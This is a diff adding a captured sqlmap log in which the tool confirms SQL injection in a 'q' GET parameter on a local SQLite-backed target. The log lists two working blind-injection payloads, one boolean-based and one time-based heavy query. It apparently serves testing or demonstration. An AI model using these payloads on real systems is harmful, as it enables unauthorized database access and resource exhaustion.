@@ -1,0 +1,30 @@
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.8.8}
+|_ -| . [.]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[14:00:00] [INFO] testing connection to the target URL
+[14:00:01] [INFO] testing if the target URL content is stable
+[14:00:03] [INFO] testing if GET parameter 'q' is dynamic
+[14:00:04] [INFO] GET parameter 'q' appears to be dynamic
+[14:00:05] [INFO] heuristic (basic) test shows that GET parameter 'q' might be injectable
+[14:00:06] [INFO] testing for SQL injection on GET parameter 'q'
+[14:00:08] [INFO] GET parameter 'q' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable
+[14:00:11] [INFO] GET parameter 'q' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable
+GET parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 96 HTTP(s) requests:
+---
+Parameter: q (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: q=apple%' OR NOT 6539=6539-- pMDU
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: q=apple%' AND 1234=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000))))-- FdyY
+---
+[14:00:12] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[14:00:12] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/127.0.0.1'
